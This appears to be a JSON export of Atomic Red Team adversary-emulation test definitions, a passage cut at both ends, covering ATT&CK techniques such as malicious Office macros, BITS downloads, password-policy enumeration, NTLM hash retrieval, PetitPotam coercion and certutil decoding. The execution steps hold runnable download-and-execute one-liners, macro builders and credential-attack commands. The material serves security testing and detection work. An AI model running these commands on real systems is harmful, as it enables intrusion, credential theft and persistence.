"techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x", "clacwm23100jo29mq0kimakgc"], "tags": []}, {"data": {"name": "Office launching .bat file from AppData", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | bat_path | Path to malicious .bat file | String | $(\"$env:temp\\art1204.bat\") | \n | ms_product | Maldoc application Word or Excel | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c $bat_path `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x", "clacwm23100jo29mq0kimakgc"], "tags": []}, {"data": {"name": "Office Generic Payload Download", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | macro_path | Location of file which will be converted to a VBA macro\n | Path | PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt | \n | c2_domain | This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.\n | Url | null | \n | c2_parent_directory | Parent directory where you have the \"malicious\" file on c2_domain server.\nWill default to root directory. Forward slashes are not needed at begining or ending of directory path\n | Path |  | \n | file_name | \"Malicious\" file to be downloaded.\nThis required file needs to be place on the user provided c2 domain\nExample file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt\n | String | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt | \n | ms_product | Maldoc application Word or Excel\n | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macroCode = Get-Content \"#{macro_path}\" -Raw\n$URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"\n$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"\nInvoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x"], "tags": []}, {"data": {"name": "Maldoc choice flags command execution", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ms_product | Maldoc application Word or Excel | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x", "clacwm23100jo29mq0kimakgc"], "tags": []}, {"data": {"name": "LNK Payload Download", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F\n", "successCriteria": null}], "techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x"], "tags": []}, {"data": {"name": "Headless Chrome code execution via VBA", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x", "clacwm23100jo29mq0kimakgc"], "tags": []}, {"data": {"name": "Excel 4 Macro", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | download_url | Download URL | String | https://live.sysinternals.com/procexp.exe | \n | uname | Username for pathing | String | $env:Username | "}, "executionSteps": [{"description": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\n$fname1 = \"$env:TEMP\\procexp.exe\"\nif (Test-Path $fname) {\n  Remove-Item $fname\n  Remove-Item $fname1\n}\n\n$xlApp = New-Object -COMObject \"Excel.Application\"\n$xlApp.Visible = $True\n$xlApp.DisplayAlerts = $False\n$xlBook = $xlApp.Workbooks.Add()\n$sheet = $xlBook.Excel4MacroSheets.Add()\n\nif (\"#{uname}\" -ne \"\") {\n  $sheet.Cells.Item(1,1) = \"#{uname}\"\n} else {\n  $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\n}\n\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"#{download_url}`\"`\"`\")\"\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"\n$sheet.Cells.Item(23,1) = \"=HALT()\"\n$sheet.Cells.Item(1,1).Name = \"runme\"\n$xlApp.Run(\"runme\")\n$xlApp.Quit()\n\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\n[System.GC]::Collect()\n[System.GC]::WaitForPendingFinalizers()\n\nRemove-Variable xlBook\nRemove-Variable xlApp\n", "successCriteria": null}], "techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x", "clacwm23100jo29mq0kimakgc"], "tags": []}, {"data": {"name": "Indirect Command Execution - pcalua.exe", "shortName": "T1202", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | payload_path | Path to payload | Path | C:\\Windows\\System32\\calc.exe | \n | process | Process to execute | String | calc.exe | "}, "executionSteps": [{"description": "pcalua.exe -a #{process}\npcalua.exe -a #{payload_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm60202yt29mq22f33piq", "clacwm1yu00gu29mq4ytqf6vp"], "tags": []}, {"data": {"name": "Indirect Command Execution - forfiles.exe", "shortName": "T1202", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process | Process to execute | String | calc.exe | "}, "executionSteps": [{"description": "forfiles /p c:\\windows\\system32 /m notepad.exe /c #{process}\n", "successCriteria": null}], "techniqueIds": ["clacwm60202yt29mq22f33piq", "clacwm1yu00gu29mq4ytqf6vp"], "tags": []}, {"data": {"name": "Indirect Command Execution - conhost.exe", "shortName": "T1202", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process | Process to execute | String | notepad.exe | "}, "executionSteps": [{"description": "conhost.exe \"#{process}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm60202yt29mq22f33piq", "clacwm1yu00gu29mq4ytqf6vp"], "tags": []}, {"data": {"name": "Get-DomainPolicy with PowerView", "shortName": "T1201", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm6j103j929mqajrvd8fd"], "tags": []}, {"data": {"name": "Examine password policy - macOS", "shortName": "T1201", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Lists the password policy to console on macOS.\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "pwpolicy getaccountpolicies", "successCriteria": null}], "techniqueIds": ["clacwm6j103j929mqajrvd8fd", "clacwm28b00nd29mq8vuu41ec"], "tags": []}, {"data": {"name": "Examine password expiration policy - All Linux", "shortName": "T1201", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "cat /etc/login.defs\n", "successCriteria": null}], "techniqueIds": ["clacwm6j103j929mqajrvd8fd", "clacwm28b00nd29mq8vuu41ec"], "tags": []}, {"data": {"name": "Examine password complexity policy - Ubuntu", "shortName": "T1201", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Lists the password complexity policy to console on Ubuntu Linux.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "cat /etc/pam.d/common-password\n", "successCriteria": null}], "techniqueIds": ["clacwm6j103j929mqajrvd8fd", "clacwm28b00nd29mq8vuu41ec"], "tags": []}, {"data": {"name": "Examine password complexity policy - CentOS/RHEL 7.x", "shortName": "T1201", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "cat /etc/security/pwquality.conf\n", "successCriteria": null}], "techniqueIds": ["clacwm6j103j929mqajrvd8fd", "clacwm28b00nd29mq8vuu41ec"], "tags": []}, {"data": {"name": "Examine password complexity policy - CentOS/RHEL 6.x", "shortName": "T1201", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "successCriteria": null}], "techniqueIds": ["clacwm6j103j929mqajrvd8fd", "clacwm28b00nd29mq8vuu41ec"], "tags": []}, {"data": {"name": "Examine local password policy - Windows", "shortName": "T1201", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Lists the local password policy to console on Windows.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net accounts\n", "successCriteria": null}], "techniqueIds": ["clacwm6j103j929mqajrvd8fd", "clacwm28b00nd29mq8vuu41ec"], "tags": []}, {"data": {"name": "Examine domain password policy - Windows", "shortName": "T1201", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Lists the domain password policy to console on Windows.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net accounts /domain\n", "successCriteria": null}], "techniqueIds": ["clacwm6j103j929mqajrvd8fd", "clacwm28b00nd29mq8vuu41ec"], "tags": []}, {"data": {"name": "Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy", "shortName": "T1201", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "get-addefaultdomainpasswordpolicy", "successCriteria": null}], "techniqueIds": ["clacwm6j103j929mqajrvd8fd"], "tags": []}, {"data": {"name": "Persist, Download, & Execute", "shortName": "T1197", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_path | Path of command to execute | Path | C:\\Windows\\system32\\notepad.exe | \n | bits_job_name | Name of BITS job | String | AtomicBITS | \n | local_file | Local file path to save downloaded file | Path | %temp%\\bitsadmin3_flag.ps1 | \n | remote_file | Remote file to download | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md | "}, "executionSteps": [{"description": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\nbitsadmin.exe /resume #{bits_job_name}\nping -n 5 127.0.0.1 >nul 2>&1\nbitsadmin.exe /complete #{bits_job_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6mt03na29mq9gr0hoho", "clacwm1e4003929mq3s5ce1b5"], "tags": []}, {"data": {"name": "Bitsadmin Download (PowerShell)", "shortName": "T1197", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_file | Remote file to download | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md | \n | local_file | Local file path to save downloaded file | Path | $env:TEMP\\bitsadmin2_flag.ps1 | "}, "executionSteps": [{"description": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6mt03na29mq9gr0hoho", "clacwm1e4003929mq3s5ce1b5"], "tags": []}, {"data": {"name": "Bitsadmin Download (cmd)", "shortName": "T1197", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_file | Remote file to download | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md | \n | local_file | Local file path to save downloaded file | Path | %temp%\\bitsadmin1_flag.ps1 | "}, "executionSteps": [{"description": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6mt03na29mq9gr0hoho", "clacwm1e4003929mq3s5ce1b5"], "tags": []}, {"data": {"name": "Bits download using desktopimgdownldr.exe (cmd)", "shortName": "T1197", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (\u201c-k netsvc -p -s BITS\u201d) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_file | Remote file to download | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md | \n | download_path | Local file path to save downloaded file | Path | SYSTEMROOT=C:\\Windows\\Temp | \n | cleanup_path | path to delete file as part of cleanup_command | Path | C:\\Windows\\Temp\\Personalization\\LockScreenImage | \n | cleanup_file | file to remove as part of cleanup_command | String | *.md | "}, "executionSteps": [{"description": "set \"#{download_path}\" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\n", "successCriteria": null}], "techniqueIds": ["clacwm6mt03na29mq9gr0hoho", "clacwm1e4003929mq3s5ce1b5"], "tags": []}, {"data": {"name": "Octopus Scanner Malware Open Source Supply Chain", "shortName": "T1195", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an adversary Octupus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | rat_payload | RAT dropper ExplorerSync.db | Path | $env:TEMP\\ExplorerSync.db | "}, "executionSteps": [{"description": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db\nschtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f\n", "successCriteria": null}], "techniqueIds": ["clacwm60n02ze29mq14ljf6wk"], "tags": []}, {"data": {"name": "WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS", "shortName": "T1187", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')\nInvoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"", "successCriteria": null}], "techniqueIds": ["clacwm6jd03jh29mqh1ekfzb2"], "tags": []}, {"data": {"name": "PetitPotam", "shortName": "T1187", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | captureServerIP | Computer IP to use to receive the authentication (ex. attacker machine used for NTLM relay) | string | 10.0.0.3 | \n | targetServerIP | Computer IP to force authentication from (ex. domain controller) | string | 10.0.0.2 | \n | efsApi | EFS API to use to coerce authentication | string | 1 | \n | petitpotam_path | PetitPotam Windows executable | path | $env:TEMP\\PetitPotam.exe | "}, "executionSteps": [{"description": "& \"#{petitpotam_path}\" #{captureServerIP} #{targetServerIP} #{efsApi}\nWrite-Host \"End of PetitPotam attack\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6jd03jh29mqh1ekfzb2"], "tags": []}, {"data": {"name": "Firefox", "shortName": "T1176", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a file called test.wma, with the duration of 30 seconds\n\n\n**Supported Platforms:** linux, windows, macos\n\n"}, "executionSteps": [{"description": "1. Navigate to [about:debugging](about:debugging) and\nclick \"Load Temporary Add-on\"\n\n2. Navigate to [manifest.json](./src/manifest.json)\n\n3. Then click 'Open'\n", "successCriteria": null}], "techniqueIds": ["clacwm5zl02ya29mqb6627lbr", "clacwm1f7003x29mq32fg0vfu"], "tags": []}, {"data": {"name": "Edge Chromium Addon - VPN", "shortName": "T1176", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries may use VPN extensions in an attempt to hide traffic sent from a compromised host. This will install one (of many) available VPNS in the Edge add-on store.\n\n\n**Supported Platforms:** windows, macos\n\n"}, "executionSteps": [{"description": "1. Navigate to https://microsoftedge.microsoft.com/addons/detail/fjnehcbecaggobjholekjijaaekbnlgj\nin Edge Chromium\n\n2. Click 'Get'\n", "successCriteria": null}], "techniqueIds": ["clacwm5zl02ya29mqb6627lbr", "clacwm1f7003x29mq32fg0vfu"], "tags": []}, {"data": {"name": "Chrome (Developer Mode)", "shortName": "T1176", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Turn on Chrome developer mode and Load Extension found in the src directory\n\n**Supported Platforms:** linux, windows, macos\n\n"}, "executionSteps": [{"description": "1. Navigate to [chrome://extensions](chrome://extensions) and\ntick 'Developer Mode'.\n\n2. Click 'Load unpacked extension...' and navigate to\n[Browser_Extension](../t1176/src/)\n\n3. Click 'Select'\n", "successCriteria": null}], "techniqueIds": ["clacwm5zl02ya29mqb6627lbr", "clacwm1f7003x29mq32fg0vfu"], "tags": []}, {"data": {"name": "Chrome (Chrome Web Store)", "shortName": "T1176", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Install the \"Minimum Viable Malicious Extension\" Chrome extension\n\n**Supported Platforms:** linux, windows, macos\n\n"}, "executionSteps": [{"description": "1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend\nin Chrome\n\n2. Click 'Add to Chrome'\n", "successCriteria": null}], "techniqueIds": ["clacwm5zl02ya29mqb6627lbr", "clacwm1f7003x29mq32fg0vfu"], "tags": []}, {"data": {"name": "Hex decoding with shell utilities", "shortName": "T1140", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | message | Message to print to the screen | String | Hello from Atomic Red Team test T1140! | \n | encoded_file | File to temporarily save encoded text | Path | /tmp/T1140.encoded | "}, "executionSteps": [{"description": "ENCODED=$(echo '#{message}' | xxd -ps -c 256)\nprintf $ENCODED | xxd -r -p\necho $ENCODED | xxd -r -p\necho $(echo $ENCODED) | xxd -r -p\necho $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}\necho $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p\n", "successCriteria": null}], "techniqueIds": ["clacwm60b02z429mqaasj364p"], "tags": []}, {"data": {"name": "Deobfuscate/Decode Files Or Information", "shortName": "T1140", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable | name of executable | Path | C:\\Windows\\System32\\calc.exe | "}, "executionSteps": [{"description": "certutil -encode #{executable} %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm60b02z429mqaasj364p", "clacwm1nc009f29mq0jkzcig1"], "tags": []}, {"data": {"name": "Certutil Rename and Decode", "shortName": "T1140", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable | name of executable/file to decode | Path | C:\\Windows\\System32\\calc.exe | "}, "executionSteps": [{"description": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode #{executable} %temp%\\T1140_calc2.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm60b02z429mqaasj364p", "clacwm1nc009f29mq0jkzcig1"], "tags": []}, {"data": {"name": "Base64 decoding with shell utilities", "shortName": "T1140", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | message | Message to print to the screen | String | Hello from Atomic Red Team test T1140! | \n | encoded_file | File to temporarily save encoded text | Path | /tmp/T1140.encoded | "}, "executionSteps": [{"description": 